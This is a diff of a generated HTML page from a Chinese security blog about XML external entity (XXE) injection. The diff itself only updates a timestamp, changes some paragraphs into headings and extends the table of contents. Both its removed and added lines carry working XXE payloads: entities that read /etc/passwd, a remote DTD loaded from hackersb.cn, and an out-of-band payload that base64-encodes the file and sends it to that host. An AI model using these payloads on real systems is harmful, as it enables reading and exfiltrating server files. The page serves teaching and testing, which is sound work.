@@ -62,7 +62,7 @@
 <meta property="og:site_name" content="Alairs Notepad">
 <meta property="og:description" content="方法1：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;  方法2：">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-24T05:16:15.281Z">
+<meta property="og:updated_time" content="2019-08-24T05:17:22.353Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XML实体注入漏洞">
 <meta name="twitter:description" content="方法1：1&amp;lt;!DOCTYPE a [ &amp;lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;  方法2：">
@@ -255,7 +255,7 @@
                 
               
 
-              <time title="创建时间：2019-08-24 12:44:36 / 修改时间：13:16:15" itemprop="dateCreated datePublished" datetime="2019-08-24T12:44:36+08:00">2019-08-24</time>
+              <time title="创建时间：2019-08-24 12:44:36 / 修改时间：13:17:22" itemprop="dateCreated datePublished" datetime="2019-08-24T12:44:36+08:00">2019-08-24</time>
             </span>
           
             
@@ -296,16 +296,12 @@
 <p>其中attack.dtd的内容为：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure>
 
-<p>方法3：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a SYSTEM <span class="string">"http://www.hackersb.cn/attack.dtd"</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a SYSTEM <span class="string">"http://www.hackersb.cn/attack.dtd"</span>&gt;</span><br></pre></td></tr></table></figure>
 
 <p>其中attack.dtd内容同上不变。</p>
-<p>构造payload：</p>
-<p>1、</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Striker<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wechat</span>&gt;</span>strikersb<span class="tag">&lt;/<span class="name">wechat</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">public_wechat</span>&gt;</span>sec_fe<span class="tag">&lt;/<span class="name">public_wechat</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">website</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">website</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h4><h5 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Striker<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wechat</span>&gt;</span>strikersb<span class="tag">&lt;/<span class="name">wechat</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">public_wechat</span>&gt;</span>sec_fe<span class="tag">&lt;/<span class="name">public_wechat</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">website</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">website</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>2、</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://www.hackersb.cn/attack.dtd"</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%mydata;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://www.hackersb.cn/attack.dtd"</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%mydata;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
 <p>其中attack.dtd的内容为：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line"><span class="string">"&lt;!ENTITY &amp;#x25; mydata SYSTEM "</span>http:<span class="comment">//www.hackersb.cn/?%file"&gt;"</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
@@ -398,7 +394,7 @@
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">2.</span> <span class="nav-text">方法2：</span></a></li></ol></div>
+            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法1："><span class="nav-number">1.</span> <span class="nav-text">方法1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法2："><span class="nav-number">2.</span> <span class="nav-text">方法2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法3："><span class="nav-number">3.</span> <span class="nav-text">方法3：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#构造payload："><span class="nav-number">3.1.</span> <span class="nav-text">构造payload：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、"><span class="nav-number">3.1.1.</span> <span class="nav-text">1、</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2、"><span class="nav-number">3.1.2.</span> <span class="nav-text">2、</span></a></li></ol></li></ol></li></ol></div>
           </div>
         
       </div>
